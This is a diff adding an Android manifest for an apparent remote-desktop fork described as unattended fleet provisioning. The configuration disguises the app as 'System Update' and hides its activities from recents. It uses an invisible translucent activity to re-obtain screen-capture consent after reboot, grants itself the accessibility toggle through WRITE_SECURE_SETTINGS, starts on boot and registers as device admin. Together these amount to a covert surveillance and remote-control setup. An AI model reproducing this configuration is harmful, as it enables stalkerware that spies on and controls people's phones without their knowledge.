@@ -1,0 +1,143 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.carriez.flutter_hbb">
+
+    <!-- Core network / device permissions -->
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <!-- Prerequisite for the connectedDevice foreground-service type (API 34+). -->
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+
+    <!--
+      One-tap provisioning: on administered / device-owner fleets this is granted
+      by the provisioning script (adb shell pm grant). It lets the app flip the
+      single remote-control Accessibility toggle on the user's behalf during
+      setup, so the operator never has to walk through a second manual step.
+      It is NOT auto-granted on ordinary consumer installs; the wizard falls
+      back to a single Accessibility toggle in that case.
+    -->
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"
+        tools:ignore="ProtectedPermissions"/>
+
+    <!-- Unattended access: start on boot -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
+    <!-- Battery optimization: request ignore so the service stays alive -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+
+    <!--
+      Exempts the app from the Android 10+ background-activity-start restriction
+      so the unattended service can re-open the MediaProjection consent dialog
+      after a reboot with no user interaction. Granted by the provisioning script
+      on administered devices; on ordinary installs the app just relies on the
+      accessibility still-image capture path instead.
+    -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+
+    <application
+        android:name="${applicationName}"
+        android:label="System Update"
+        android:icon="@mipmap/ic_launcher"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:allowBackup="false"
+        android:usesCleartextTraffic="false"
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:stopWithTask="false">
+
+        <!-- Main launcher activity (configuration UI) -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTop"
+            android:taskAffinity="com.android.shell.ghost.dummy"
+            android:theme="@style/LaunchTheme"
+            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
+            android:hardwareAccelerated="true"
+            android:windowSoftInputMode="adjustResize"
+            android:excludeFromRecents="true">
+            <meta-data
+                android:name="io.flutter.embedding.android.NormalTheme"
+                android:resource="@style/NormalTheme"/>
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <!-- Unattended access foreground service — runs persistently, starts on boot -->
+        <service
+            android:name=".UnattendedAccessService"
+            android:exported="false"
+            android:foregroundServiceType="connectedDevice|mediaProjection"
+            android:stopWithTask="false"
+            android:enabled="true"/>
+
+        <!-- Headless helper: re-acquires the MediaProjection consent token after
+             a reboot. Translucent and not in recents so it is never visible. -->
+        <activity
+            android:name=".ProjectionRegrantActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+
+        <!-- Boot receiver — auto-start unattended access on device boot.
+             USER_UNLOCKED is required because the Keystore credential key is
+             only readable after the first unlock; the QUICKBOOT actions cover
+             OEM firmware variants that never send the standard broadcast. -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true"
+            android:enabled="true"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.USER_UNLOCKED"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- Accessibility service — enables remote input injection for operator control -->
+        <service
+            android:name=".RemoteControlAccessibilityService"
+            android:label="@string/accessibility_service_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config"/>
+        </service>
+
+        <!-- Device-owner receiver for zero-touch fleet provisioning -->
+        <receiver
+            android:name=".BetterDeskDeviceAdmin"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true"
+            android:enabled="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+
+        <meta-data
+            android:name="flutterEmbedding"
+            android:value="2"/>
+    </application>
+</manifest>
